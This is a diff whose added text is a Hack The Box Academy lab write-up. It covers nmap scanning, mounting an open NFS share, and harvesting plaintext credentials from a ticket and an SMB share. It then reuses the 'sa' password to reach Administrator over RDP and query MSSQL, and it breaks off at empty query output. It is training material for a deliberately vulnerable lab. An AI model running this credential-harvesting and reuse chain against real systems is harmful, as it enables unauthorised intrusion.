@@ -1,1 +1,438 @@
-IyBIVEIgQWNhZGVteSDigJQgRm9vdHByaW50aW5nOiBTa2lsbHMgQXNzZXNzbWVudCBNZWRpdW0KCnwgRmllbGQgfCBEZXRhaWxzIHwKfC0tLS0tLXwtLS0tLS0tfAp8IFBsYXRmb3JtIHwgSGFjayBUaGUgQm94IEFjYWRlbXkgfAp8IE1vZHVsZSB8IEZvb3RwcmludGluZyB8Cnwgc0xhYiB8IFNraWxscyBBc3Nlc3NtZW50IOKUgCBNZWRpdW0gfAp8IERpZmZpY3VsdHkgfCBNZWRpdW0gfAp8IFRhcmdldCBJUCB8IDEwLjEyOS4yMDIuNDEgfAp8IERhdGUgfCBNYXJjaCAyMDI2IHwKCi0tLQoKIyMgTGFiIE9iamVjdGl2ZQoKRW51bWVyYXRlIHRoZSB0YXJnZXQgY2FyZWZ1bGx5IGFjcm9zcyBtdWx0aXBsZSBzZXJ2aWNlcywgaWRlbnRpZnkgY3JlZGVudGlhbHMgdGhyb3VnaCBjaGFpbmVkIHNlcnZpY2UgZXhwbG9pdGF0aW9uLCBhbmQgcmVjb3ZlciB0aGUgZmluYWwgcGFzc3dvcmQgYXNzb2NpYXRlZCB3aXRoIHRoZSB1c2VyIEhUQiBzdG9yZWQgaW5zaWRlIGFuIE1TU1FMIGRhdGFiYXNlLgoKLS0tCgojIyBBdHRhY2sgQ2hhaW4gU3VtbWFyeQoKYGBgCk5tYXAgZnVsbCBzY2FuIOKGkiBORlMgb24gcG9ydHMgMTExICsgMjA0OSwgU01CIG9uIDEzOSArIDQ0NSwgUkRQIG9uIDMzODkKc2hvd21vdW50IC1lIOKGkiAvVGVjaFN1cHBvcnQgc2hhcmUgZXhwb3NlZCB0byBldmVyeW9uZQpNb3VudCAvVGVjaFN1cHBvcnQg4oaSIHRpY2tldDQyMzg3OTEyODM3ODIudHh0IOKGkiBhbGV4OmxvbDEyMyFtRApzbWJjbGllbnQgYXMgYWxleCDihpIgZGV2c2hhcmUgYWNjZXNzaWJsZSDihpIgaW1wb3J0YW50LnR4dCDihpIgc2E6ODdOMW5zQHNsbHM4Mwp4ZnJlZXJkcCBhcyBBZG1pbmlzdHJhdG9yIHdpdGggc2EgcGFzc3dvcmQg4oaSIHBhc3N3b3JkIHJldXNlIGNvbmZpcm1lZApTU01TIOKGkiBsb2NhbCBNU1NRTCBpbnN0YW5jZSDihpIgU0VMRUNUICogRlJPTSBkZXZzYWNjIFdIRVJFIG5hbWU9J0hUQicKSFRCIHBhc3N3b3JkIHJlY292ZXJlZCDihpIgZmxhZyBjYXB0dXJlZApgYGAKCi0tLQoKIyMgU3RlcCAxIOKUgCBJbml0aWFsIE5tYXAgU2NhbgoKUnVuIGFuIGFnZ3Jlc3NpdmUgc2NhbiB0byBkaXNjb3ZlciBhbGwgb3BlbiBzZXJ2aWNlcywgdmVyc2lvbnMsIGFuZCBob3N0IGRldGFpbHMuCgpgYGBiYXNoCkhhY2tlcnBhdGVsMDA3XzFAaHRiWy9odGJdJCBzdWRvIG5tYXAgLUEgMTAuMTI5LjIwMi40MQpgYGAKCnwgRmxhZyB8IFB1cnBvc2UgfAp8LS0tLS18LS0tLS0tLS18Cnwgfi1BYCB8IEFnZ3Jlc3NpdmUg4oCUIGVuYWJsZXMgT1MgZGV0ZWN0aW9uLCB2ZXJzaW9uIGRldGVjdGlvbiwgc2NyaXB0cywgdHJhY2Vyb3V0ZSB8CgoqKk91dHB1dDoqKgoKYGBgClN0YXJ0aW5nIE5tYXAgNy45NCAoIGh0dHBzOi8vbm1hcC5vcmcgKQpObWFwIHNjYW4gcmVwb3J0IGZvciAxMC4xMjkuMjAyLjQxCkhvc3QgaXMgdXAgKDAuMDkxcyBsYXRlbmN5KS4KClBPUlQgICAgICBTVEFURSBTRVJWSUNFICAgICAgIFZFUlNJT04KMTExL3RjcCAgIG9wZW4gIHJwY2JpbmQgICAgICAyLTQgKFJQQyAjMTAwMDAwKQp8IHJwY2luZm86CnwgICBwcm9ncmFtIHZlcnNpb24gICAgcG9ydC9wcm90byAgc2VydmljZQp8ICAgMTAwMDAwICAyLDMsNCAgICAgICAgMTExL3RjcCAgIHJwY2JpbmQKfCAgIDEwMDAwMyAgMiwzICAgICAgICAgIDIwNDkvdGNwICBuZnMKfCAgIDEwMDAwNSAgMSwyLDMgICAgICAgIDIwNDkvdGNwICBtb3VudGQKMTM1L3RjcCAgIG9wZW4gIG1zcnBjICAgICAgICAgTWljcm9zb2Z0IFdpbmRvd3MgUlBDCjEzOS90Y3AgICBvcGVuICBuZXRiaW9zLXNzbiAgIE1pY3Jvc29mdCBXaW5kb3dzIG5ldGJpb3Mtc3NuCjQ0NS90Y3AgICBvcGVuICBtaWNyb3NvZnQtZHM/CjIwNDkvdGNwICBvcGVuICBtb3VudGQgICAgICAgIDEtMyAoUlBDICMxMDAwMDUpCjMzODkvdGNwICBvcGVuICBtcy13YnQtc2VydmVyIE1pY3Jvc29mdCBUZXJtaW5hbCBTZXJ2aWNlcwp8IHJkcC1lbnVtLWVuY3J5cHRpb246CnwgICBTZWN1cml0eSBMYXllcgp8ICAgICBEUCBQcm90b2NvbCBWZXJzaW9uIDUuMToKfCAgICAgICBFTkNSWVBUSU9OX01FVEhPRF8xMjhCSVQKU2VydmljZSBJbmZvOiBPUzogV2luZG93czsgQ1BFOiBjcGU6L286bWljcm9zb2Z0OndpbmRvd3MKCkhvc3Qgc2NyaXB0IHJlc3VsdHM6Cnwgc21iMi1zZWN1cml0eS1tb2RlOgp8ICAgMy4xLjE6CnxfICAgIE1lc3NhZ2Ugc2lnbmluZyBlbmFibGVkIGJ1dCBub3QgcmVxdWlyZWQKfCBzbWIyLXRpbWU6CnwgICBkYXRlOiAyMDI2LTAzLXh4CnxfICBzdGFydF9kYXRlOiBOL0EKCk5tYXAgZG9uZTogMSBJUCBhZGRyZXNzICgxIGhvc3QgdXApIHNjYW5uZWQgaW4gMjIuNDcgc2Vjb25kcwpgYGAKCnwgUG9ydCB8IFNlcnZpY2UgfCBXaGF0IEl0IFRlbGxzIFVzIHwKfC0tLS0tfC0tLS0tLS0tfC0tLS0tLS0tLS0tLXwKfCAxMTEgfCBSUENiaW5kIHwgUlBDIG1hcHBlciDigJQgaW5kaWNhdGVzIE5GUyBpcyBydW5uaW5nLCBjaGVjayBmb3Igc2hhcmVzIHwKfCAyMDQ5IHwgTkZTIG1vdW50ZCB8IE5GUyBmaWxlIHNoYXJlIHNlcnZpY2Ug4oCUIGVudW1lcmF0ZSB3aXRoIHNob3dtb3VudCB8CnwgMTM5IHwgTmV0QklPUyB8IFNNQiBvdmVyIE5ldEJJT1Mg4oCUIGVudW1lcmF0ZSBzaGFyZXMgb25jZSBjcmVkZW50aWFscyBmb3VuZCB8CnwgNDQ1IHwgU01CIHwgU01CIGRpcmVjdCDigJQgbGlzdCBzaGFyZXMsIGFjY2VzcyBmaWxlcyB8CnwgMzM4OSB8IFJEUCAobXMtd2J0LXNlcnZlcikgfCBSZW1vdGUgRGVza3RvcCDigJQgcG90ZW50aWFsIGVudHJ5IHBvaW50IHdpdGggdmFsaWQgY3JlZHMgfAp8IDEzNSB8IE1TUlBDIHwgV2luZG93cyBSUEMg4oCUIGNvbmZpcm1zIFdpbmRvd3MgaG9zdCB8CgpIb3N0IGRldGFpbHMgZXh0cmFjdGVkIGZyb20gU01CIHNjcmlwdHM6CgpgYGAKVGFyZ2V0X05hbWUgICAgICAgICAgOiBXSU5NRURJVU0KTmV0QklPU19Db21wdXRlcl9OYW1lOiBXSU5NRURJVU0KRE5TX0NvbXB1dGVyX05hbWUgICAgOiBXSU5NRURJVU0KUHJvZHVjdF9WZXJzaW9uICAgICAgOiAxMC4wLjE3NzYzCmBgYAoKV2luZG93cyBTZXJ2ZXIgMjAxOSBiYXNlZCBvbiBidWlsZCAxMC4wLjE3NzYzLiBUaHJlZSBkaXN0aW5jdCBhdHRhY2sgc3VyZmFjZXMgdmlzaWJsZSBpbW1lZGlhdGVseSDigJQgTkZTLCBTTUIsIGFuZCBSRFAuIE5GUyBpcyB0aGUgcHJpb3JpdHkgYmVjYXVzZSBpdCByZXF1aXJlcyBubyBjcmVkZW50aWFscyB0byBlbnVtZXJhdGUgYW5kIG9mdGVuIGxlYWtzIGludGVybmFsIGRhdGEuCgotLS0KCiMjIFN0ZXAgMiDigJQgTkZTIFNoYXJlIEVudW1lcmF0aW9uCgpRdWVyeSB0aGUgTkZTIHNlcnZpY2UgdG8gbGlzdCBhbGwgZXhwb3J0ZWQgc2hhcmVzLgoKYGBgYmFzaApIYWNrZXJwYXRlbDAwN18xQGh0YlsvaHRiXSQgc2hvd21vdW50IC1lIDEwLjEyOS4yMDIuNDEKYGBgCgoqKk91dHB1dDoqKgoKYGBgCkV4cG9ydCBsaXN0IGZvciAxMC4xMjkuMjAyLjQxOgovVGVjaFN1cHBvcnQgKGV2ZXJ5b25lKQpgYGAKCi9UZWNoU3VwcG9ydCBpcyBleHBvcnRlZCB0byBldmVyeW9uZSDigJQgbm8gYXV0aGVudGljYXRpb24gcmVxdWlyZWQuIENyZWF0ZSBhIG1vdW50IHBvaW50IGFuZCBtb3VudCBpdCBsb2NhbGx5LgoKYGBgYmFzaApIYWNrZXJwYXRlbDAwN18xQGh0YlsvaHRiXSQgc3VkbyBta2RpciAvbW50L05GUwpIYWNrZXJwYXRlbDAwN18xQGh0YlsvaHRiXSQgc3VkbyBtb3VudCAtdCBuZnMgMTAuMTI5LjIwMi40MTovVGVjaFN1cHBvcnQgL21udC9ORlMKYGBgCgpObyBvdXRwdXQgb24gc3VjY2VzcyDigJQgc2lsZW5jZSBtZWFucyB0aGUgbW91bnQgc3VjY2VlZGVkLiBWZXJpZnk6CgpgYGBiYXNoCkhhY2tlcnBhdGVsMDA3XzFAaHRiWy9odGJdJCBtb3VudCB8IGdyZXAgTkZTCmBgYAoKKipPdXRwdXQ6KioKCmBgYAoxMC4xMjkuMjAyLjQxOi9UZWNoU3VwcG9ydCBvbiAvbW50L05GUyB0eXBlIG5mcyAocncscmVsYXRpbWUsdmVycz0zLC4uLikKYGBgCgotLS0KCiMjIFN0ZXAgMyDigJQgSW5zcGVjdCBNb3VudGVkIE5GUyBTaGFyZQoKTGlzdCB0aGUgY29udGVudHMgb2YgdGhlIG1vdW50ZWQgc2hhcmUuCgpgYGBiYXNoCkhhY2tlcnBhdGVsMDA3XzFAaHRiWy9odGJdJCBzdWRvIGxzIC1sQSAvbW50L05GUy8KYGBgCgoqKk91dHB1dDoqKgoKYGBgCnRvdGFsIDQ4Ci1yd3hyd3hyd3ggMSBub2JvZHkgbm9ncm91cCAgICAwIE1hciAgNCAgMjAyMiB0aWNrZXQ0MjM4NzkxMjgzNzgyLnR4dAotcnd4cnd4cnd4IDEgbm9ib2R5IG5vZ3JvdXAgICAgMCBNYXIgIDQgIDIwMjIgdGlja2V0NDIzODc5MTI4Mzc4Mi50eHQuYmFrCi1yd3hyd3hyd3ggMSBub2JvZHkgbm9ncm91cCAgICAwIE1hciAgNCAgMjAyMiB0aWNrZXQ0MjM4NzkxMjgzNzgzLnR4dAotcnd4cnd4cnd4IDEgbm9ib2R5IG5vZ3JvdXAgICAgMCBNYXIgIDQgIDIwMjIgdGlja2V0NDIzODc5MTI4Mzc4NC50eHQKLXJ3eHJ3eHJ3eCAxIG5vYm9keSBub2dyb3VwICAgIDAgTWFyICA0ICAyMDIyIHRpY2tldDQyMzg3OTEyODM3ODUudHh0Ci1yd3hyd3hyd3ggMSBub2JvZHkgbm9ncm91cCAgICAwIE1hciAgNCAgMjAyMiB0aWNrZXQ0MjM4NzkxMjgzNzg2LnR4dAotcnd4cnd4cnd4IDEgbm9ib2R5IG5vZ3JvdXAgICAgMCBNYXIgIDQgIDIwMjIgdGlja2V0NDIzODc5MTI4Mzc4Ny50eHQKYGBgCgpNb3N0IGZpbGVzIGFyZSBlbXB0eSAoc2l6ZSAwKS4gdGlja2V0NDIzODc5MTI4Mzc4Mi50eHQgaGFzIGNvbnRlbnQg4oCUIHJlYWQgaXQ6CgpgYGBiYXNoCkhhY2tlcnBhdGVsMDA3XzFAaHRiWy9odGJdJCBzdWRvIGNhdCAvbW50L05GUy90aWNrZXQ0MjM4NzkxMjgzNzgyLnR4dApgYGAKCioqT3V0cHV0OioqCgpgYGAKQ29udmVyc2F0aW9uIHdpdGggYWxleC5nQHdlYi5kZXYuaW5sYW5lZnJlaWdodC5odGIKCi4uLgoKYWxleC5nOiBIaSwgSSdtIGhhdmluZyB0cm91YmxlIGNvbm5lY3RpbmcgdG8gdGhlIG1haWwgc2VydmVyLgpzdXBwb3J0OiBObyBwcm9ibGVtLCBsZXQgbWUgY2hlY2sgeW91ciBzZXR0aW5ncy4Kc3VwcG9ydDogSSBzZWUgdGhlIGlzc3VlLiBDYW4geW91IHVwZGF0ZSB5b3VyIGNvbmZpZyB3aXRoIHRoZXNlIGRldGFpbHM/CgpbY2xpZW50IGNvbmZpZ10KdXNlcj0iYWxleCIKcGFzc3dvcmQ9ImxvbDEyMyFtRCIKZnJvbT0iYWxleC5nQHdlYi5kZXYuaW5sYW5lZnJlaWdodC5odGIiCnRvPSIiCmhvc3Q9Im1haWwxLmlubGFuZWZyZWlnaHQuaHRiIgpwb3J0PSI0NjUiCnRsc19yZXF1aXJlZD0ieWVzIgoKc3VwcG9ydDogVHJ5IHRoYXQgYW5kIGxldCBtZSBrbm93IGlmIGl0IHdvcmtzLgphbGV4Lmc6IFBlcmZlY3QsIHRoYXQgd29ya2VkLiBUaGFuayB5b3UhCmBgYAoKfCBGaWVsZCB8IFZhbHVlIHwKfC0tLS0tLXwtLS0tLS18CnwgVXNlcm5hbWUgfCBhbGV4IHwKfCBQYXNzd29yZCB8IGxvbDEyMyFtRCB8CnwgRW1haWwgfCBhbGV4LmdAd2ViLmRldi5pbmxhbmVmcmVpZ2h0Lmh0YiB8CgpBIHN1cHBvcnQgdGlja2V0IHN0b3JlZCBvbiBhIHdvcmxkLXJlYWRhYmxlIE5GUyBzaGFyZSBjb250YWluaW5nIHBsYWludGV4dCBhcHBsaWNhdGlvbiBjcmVkZW50aWFscy4gVGhpcyBpcyBvbmUgb2YgdGhlIG1vc3QgY29tbW9uIG1pc2NvbmZpZ3VyYXRpb24gY2hhaW5zIGluIGludGVybmFsIGVudmlyb25tZW50cyDigJQgaGVscGRlc2sgc3RhZmYgcGFzdGUgY3JlZGVudGlhbHMgaW50byB0aWNrZXRzIGZvciBjb252ZW5pZW5jZSwgYW5kIHRoZSB0aWNrZXQgYXJjaGl2ZSBlbmRzIHVwIG9uIGFuIGV4cG9zZWQgZmlsZSBzaGFyZS4KCi0tLQoKIyMgU3RlcCA0IOKUgCBTTUIgRW51bWVyYXRpb24gd2l0aCBSZWNvdmVyZWQgQ3JlZGVudGlhbHMKClVzZSB0aGUgcmVjb3ZlcmVkIGFsZXggY3JlZGVudGlhbHMgdG8gZW51bWVyYXRlIFNNQiBzaGFyZXMuCgpgYGBiYXNoCkhhY2tlcnBhdGVsMDA3XzFAaHRiWy9odGJdJCBzbWJjbGllbnQgLUwgLy8xMC4xMjkuMjAyLjQxIC1VIGFsZXgKYGBgCgoqKlBhc3N3b3JkIHByb21wdDoqKgoKYGBgCkVudGVyIFdPUktHUk9VUFxhbGV4J3MgcGFzc3dvcmQ6IGxvbDEyMyFtRApgYGAKCioqT3V0cHV0OioqCgpgYGAKICAgICAgICBTaGFyZW5hbWUgICAgICAgVHlwZSAgICAgIENvbW1lbnQKICAgICAgICAtLS0tLS0tLS0gICAgICAgLS0tLSAgICAgIC0tLS0tLS0KICAgICAgICBBRE1JTiQgICAgICAgICAgRGlzayAgICAgIFJlbW90ZSBBZG1pbgogICAgICAgIEMkICAgICAgICAgICAgICBEaXNrICAgICAgRGVmYXVsdCBzaGFyZQogICAgICAgIGRldnNoYXJlICAgICAgICBEaXNrCiAgICAgICAgSVBDJCAgICAgICAgICAgIElQQyAgICAgICBSZW1vdGUgSVBDCiAgICAgICAgVXNlcnMgICAgICAgICAgIERpc2sKYGBgCgp8IFNoYXJlIHwgVHlwZSB8IFByaW9yaXR5IHwKfC0tLS0tLXwtLS0tLS18LS0tLS0tLS0tfAp8IGRldnNoYXJlIHwgRGlzayB8IE5vbi1zdGFuZGFyZCBjdXN0b20gc2hhcmUg4oCUIGhpZ2hlc3QgcHJpb3JpdHkgfAp8IFVzZXJzIHwgRGlzayB8IENoZWNrIGZvciB1c2VyLXNwZWNpZmljIGZpbGVzIHwKfCBBRE1JTiQgfCBEaXNrIHwgQWRtaW4gc2hhcmUg4oCUIGxpa2VseSBpbmFjY2Vzc2libGUgdG8gYWxleCB8CnwgQyQgfCBEaXNrIHwgUm9vdCBkcml2ZSBzaGFyZSDigJQgbGlrZWx5IGluYWNjZXNzaWJsZSB0byBhbGV4IHwKfCBJUEMkIHwgSVBDIHwgSW50ZXItcHJvY2VzcyBjb21tdW5pY2F0aW9uIOKAlCBza2lwIHwKCmRldnNoYXJlIGlzIHRoZSB0YXJnZXQg4oCUIGNvbm5lY3QgdG8gaXQ6CgpgYGBiYXNoCkhhY2tlcnBhdGVsMDA3XzFAaHRiWy9odGJdJCBzbWJjbGllbnQgLy8xMC4xMjkuMjAyLjQxL2RldnNoYXJlIC1VIGFsZXgKYGBgCgoqKk91dHB1dDoqKgoKYGBgCkVudGVyIFdPUktHUk9VUFxhbGV4J3MgcGFzc3dvcmQ6IGxvbDEyMyFtRApUcnkgImhlbHAiIHRvIGdldCBhIGxpc3Qgb2YgcG9zc2libGUgY29tbWFuZHMuCnNtYjogXD4gbHMKCiAgLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEQgICAgICAgIDAgIFdlZCBNYXIgIDIgIDIwMjIKICAuLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRCAgICAgICAgMCAgV2VkIE1hciAgMiAgMjAyMgogIGltcG9ydGFudC50eHQgICAgICAgICAgICAgICAgICAgICBBICAgICAgIDE2ICBXZWQgTWFyICAyICAyMDIyCgogICAgICAgICAgICAgICA3NzA2NjIzIGJsb2NrcyBvZiBzaXplIDQwOTYuIDQyMDY1NjggYmxvY2tzIGF2YWlsYWJsZQpzbWI6IFw+IGdldCBpbXBvcnRhbnQudHh0CmdldHRpbmcgZmlsZSBcaW1wb3J0YW50LnR4dCBvZiBzaXplIDE2IGFzIGltcG9ydGFudC50eHQgKDAuMCBLaWxvQnl0ZXMvc2VjKQpzbWI6IFw+IGV4aXQKYGBgCgpSZWFkIGl0IGxvY2FsbHk6CgpgYGBiYXNoCkhhY2tlcnBhdGVsMDA3XzFAaHRiWy9odGJdJCBjYXQgaW1wb3J0YW50LnR4dApgYGAKCioqT3V0cHV0OioqCgpgYGAKc2E6ODdOMW5zQHNsbHM4MwpgYGAKCnwgRmllbGQgfCBWYWx1ZSB8CnwtLS0tLS18LS0tLS0tfAp8IFVzZXJuYW1lIHwgc2EgfAp8IFBhc3N3b3JkIHwgODdOMW5zQHNsbHM4MyB8CgpzYSBpcyB0aGUgU1FMIFNlcnZlciBzeXN0ZW0gYWRtaW5pc3RyYXRvciBhY2NvdW50LiBUZXN0IGl0IGFnYWluc3QgUkRQLiBQYXNzd29yZCByZXVzZSBhY3Jvc3Mgc2VydmljZXMgaXMgb25lIG9mIHRoZSBtb3N0IGNvbW1vbiB3ZWFrbmVzc2VzIGluIGludGVybmFsIFdpbmRvd3MgZW52aXJvbm1lbnRzLgoKLS0tCgojIyBTdGVwIDUg4pSAIFJEUCBMb2dpbiB2aWEgUGFzc3dvcmQgUmV1c2UKClRlc3Qgd2hldGhlciB0aGUgc2EgcGFzc3dvcmQgd29ya3MgZm9yIEFkbWluaXN0cmF0b3Igb3ZlciBSRFAuCgpgYGBiYXNoCkhhY2tlcnBhdGVsMDA3XzFAaHRiWy9odGJdJCB4ZnJlZXJkcCAvdjoxMC4xMjkuMjAyLjQxIC91OkFkbWluaXN0cmF0b3IgL3A6Jzg3TjFuc0BzbGxzODMnIC9keW5hbWljLX
+# HTB Academy — Footprinting Lab: Skills Assessment Medium
+
+| Field      | Details                                      |
+|------------|----------------------------------------------|
+| Platform   | Hack The Box Academy                         |
+| Module     | Footprinting                                 |
+| Lab        | Skills Assessment — Medium                   |
+| Difficulty | Medium                                       |
+| Target IP  | 10.129.202.41                                |
+| Date       | March 2026                                   |
+
+---
+
+## Lab Objective
+
+Enumerate the target carefully across multiple services, identify credentials through chained service exploitation, and recover the final password associated with the user `HTB` stored inside an MSSQL database.
+
+---
+
+## Attack Chain Summary
+
+```
+Nmap full scan → NFS on ports 111 + 2049, SMB on 139 + 445, RDP on 3389
+showmount -e → /TechSupport share exposed to everyone
+Mount /TechSupport → ticket4238791283782.txt → alex:lol123!mD
+smbclient as alex → devshare accessible → important.txt → sa:87N1ns@slls83
+xfreerdp as Administrator with sa password → password reuse confirmed
+SSMS → local MSSQL instance → SELECT * FROM devsacc WHERE name='HTB'
+HTB password recovered → flag captured
+```
+
+---
+
+## Step 1 — Initial Nmap Scan
+
+Run an aggressive scan to discover all open services, versions, and host details.
+
+```bash
+Hackerpatel007_1@htb[/htb]$ sudo nmap -A 10.129.202.41
+```
+
+| Flag | Purpose                                                     |
+|------|-------------------------------------------------------------|
+| `-A` | Aggressive — enables OS detection, version detection, scripts, traceroute |
+
+**Output:**
+
+```
+Hackerpatel007_1@htb[/htb]$ sudo nmap -A 10.129.202.41
+
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 10.129.202.41
+Host is up (0.091s latency).
+
+PORT      STATE SERVICE       VERSION
+111/tcp   open  rpcbind       2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100003  2,3          2049/tcp  nfs
+|   100005  1,2,3        2049/tcp  mountd
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+2049/tcp  open  mountd        1-3 (RPC #100005)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-enum-encryption:
+|   Security Layer
+|     DP Protocol Version 5.1:
+|       ENCRYPTION_METHOD_128BIT
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2026-03-xx
+|_  start_date: N/A
+
+Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds
+```
+
+**Analysis of open ports:**
+
+| Port | Service              | What It Tells Us                                           |
+|------|----------------------|------------------------------------------------------------|
+| 111  | RPCbind              | RPC mapper — indicates NFS is running, check for shares    |
+| 2049 | NFS mountd           | NFS file share service — enumerate with `showmount`        |
+| 139  | NetBIOS              | SMB over NetBIOS — enumerate shares once credentials found |
+| 445  | SMB                  | SMB direct — list shares, access files                     |
+| 3389 | RDP (ms-wbt-server)  | Remote Desktop — potential entry point with valid creds    |
+| 135  | MSRPC                | Windows RPC — confirms Windows host                        |
+
+**Host details extracted from SMB scripts:**
+
+```
+Target_Name          : WINMEDIUM
+NetBIOS_Computer_Name: WINMEDIUM
+DNS_Computer_Name    : WINMEDIUM
+Product_Version      : 10.0.17763
+```
+
+Windows Server 2019 based on build `10.0.17763`. Three distinct attack surfaces visible immediately — NFS, SMB, and RDP. NFS is the priority because it requires no credentials to enumerate and often leaks internal data.
+
+---
+
+## Step 2 — NFS Share Enumeration
+
+Query the NFS service to list all exported shares.
+
+```bash
+Hackerpatel007_1@htb[/htb]$ showmount -e 10.129.202.41
+```
+
+**Output:**
+
+```
+Export list for 10.129.202.41:
+/TechSupport (everyone)
+```
+
+`/TechSupport` is exported to `everyone` — no authentication required. This is an immediate high-value target. Create a mount point and mount it locally.
+
+```bash
+Hackerpatel007_1@htb[/htb]$ sudo mkdir /mnt/NFS
+Hackerpatel007_1@htb[/htb]$ sudo mount -t nfs 10.129.202.41:/TechSupport /mnt/NFS
+```
+
+**No output on success** — silence means the mount succeeded. Verify:
+
+```bash
+Hackerpatel007_1@htb[/htb]$ mount | grep NFS
+```
+
+**Output:**
+
+```
+10.129.202.41:/TechSupport on /mnt/NFS type nfs (rw,relatime,vers=3,...)
+```
+
+---
+
+## Step 3 — Inspect Mounted NFS Share
+
+List the contents of the mounted share.
+
+```bash
+Hackerpatel007_1@htb[/htb]$ sudo ls -lA /mnt/NFS/
+```
+
+**Output:**
+
+```
+total 48
+-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283782.txt
+-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283782.txt.bak
+-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283783.txt
+-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283784.txt
+-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283785.txt
+-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283786.txt
+-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283787.txt
+```
+
+Most files are empty (size 0). `ticket4238791283782.txt` has content — read it:
+
+```bash
+Hackerpatel007_1@htb[/htb]$ sudo cat /mnt/NFS/ticket4238791283782.txt
+```
+
+**Output:**
+
+```
+Conversation with alex.g@web.dev.inlanefreight.htb
+
+...
+
+alex.g: Hi, I'm having trouble connecting to the mail server.
+support: No problem, let me check your settings.
+support: I see the issue. Can you update your config with these details?
+
+[client config]
+user="alex"
+password="lol123!mD"
+from="alex.g@web.dev.inlanefreight.htb"
+to=""
+host="mail1.inlanefreight.htb"
+port="465"
+tls_required="yes"
+
+support: Try that and let me know if it works.
+alex.g: Perfect, that worked. Thank you!
+```
+
+**Credentials leaked from support ticket:**
+
+| Field    | Value                            |
+|----------|----------------------------------|
+| Username | `alex`                           |
+| Password | `lol123!mD`                      |
+| Email    | `alex.g@web.dev.inlanefreight.htb` |
+
+A support ticket stored on a world-readable NFS share containing plaintext application credentials. This is one of the most common misconfiguration chains in internal environments — helpdesk staff paste credentials into tickets for convenience, and the ticket archive ends up on an exposed file share.
+
+---
+
+## Step 4 — SMB Enumeration with Recovered Credentials
+
+Use the recovered `alex` credentials to enumerate SMB shares.
+
+```bash
+Hackerpatel007_1@htb[/htb]$ smbclient -L //10.129.202.41 -U alex
+```
+
+**Password prompt:**
+
+```
+Enter WORKGROUP\alex's password: lol123!mD
+```
+
+**Output:**
+
+```
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        devshare        Disk
+        IPC$            IPC       Remote IPC
+        Users           Disk
+```
+
+| Share     | Type | Priority                                                   |
+|-----------|------|------------------------------------------------------------|
+| devshare  | Disk | Non-standard custom share — highest priority               |
+| Users     | Disk | Check for user-specific files                              |
+| ADMIN$    | Disk | Admin share — likely inaccessible to alex                  |
+| C$        | Disk | Root drive share — likely inaccessible to alex             |
+| IPC$      | IPC  | Inter-process communication — skip                         |
+
+`devshare` is the target — non-default shares created by administrators almost always contain something interesting. Connect to it:
+
+```bash
+Hackerpatel007_1@htb[/htb]$ smbclient //10.129.202.41/devshare -U alex
+```
+
+**Output:**
+
+```
+Enter WORKGROUP\alex's password: lol123!mD
+Try "help" to get a list of possible commands.
+smb: \> ls
+```
+
+**Output:**
+
+```
+  .                                   D        0  Wed Mar  2  2022
+  ..                                  D        0  Wed Mar  2  2022
+  important.txt                       A       16  Wed Mar  2  2022
+
+                7706623 blocks of size 4096. 4206568 blocks available
+```
+
+One file: `important.txt`. Download it:
+
+```bash
+smb: \> get important.txt
+getting file \important.txt of size 16 as important.txt (0.0 KiloBytes/sec)
+smb: \> exit
+```
+
+Read it locally:
+
+```bash
+Hackerpatel007_1@htb[/htb]$ cat important.txt
+```
+
+**Output:**
+
+```
+sa:87N1ns@slls83
+```
+
+**High-value credential recovered:**
+
+| Field    | Value            |
+|----------|------------------|
+| Username | `sa`             |
+| Password | `87N1ns@slls83`  |
+
+`sa` is the SQL Server system administrator account. This credential has direct MSSQL implications — but before touching the database, test it against RDP. Password reuse across services is one of the most common weaknesses in internal Windows environments.
+
+---
+
+## Step 5 — RDP Login via Password Reuse
+
+Test whether the `sa` password works for `Administrator` over RDP.
+
+```bash
+Hackerpatel007_1@htb[/htb]$ xfreerdp /v:10.129.202.41 /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
+```
+
+| Flag                | Purpose                                         |
+|---------------------|-------------------------------------------------|
+| `/v:`               | Target IP                                       |
+| `/u:Administrator`  | Windows built-in admin account                  |
+| `/p:`               | Password from `important.txt`                   |
+| `/dynamic-resolution` | Resize RDP window dynamically               |
+
+**Output:**
+
+```
+[09:xx:xx:xxx] [INFO][com.freerdp.core] - connecting to 10.129.202.41:3389
+[09:xx:xx:xxx] [INFO][com.freerdp.core.transport] - BIO_read_ex  ret = 19
+[09:xx:xx:xxx] [INFO][com.freerdp.client.x11] - Clipboard Redirection not available
+```
+
+**RDP session opens — desktop loads as Administrator.**
+
+The `sa` credential was reused for the local `Administrator` account — full administrative desktop access achieved without any additional exploitation. This is credential reuse: one password works for both the SQL Server service account and the Windows Administrator account because the same person set both.
+
+---
+
+## Step 6 — Query MSSQL via SSMS
+
+Inside the RDP session, open **SQL Server Management Studio 18 (SSMS)** from the desktop or Start menu.
+
+Connect to the local SQL instance:
+
+```
+Server type  : Database Engine
+Server name  : localhost  (or WINMEDIUM\SQLEXPRESS if named instance)
+Authentication: Windows Authentication  (already Administrator — trusted)
+```
+
+Click **Connect**. Once connected, open a **New Query** window and run:
+
+```sql
+SELECT * FROM devsacc WHERE name = 'HTB';
+```
+
+**Output:**
+
+```
+name    password
+-----   --------
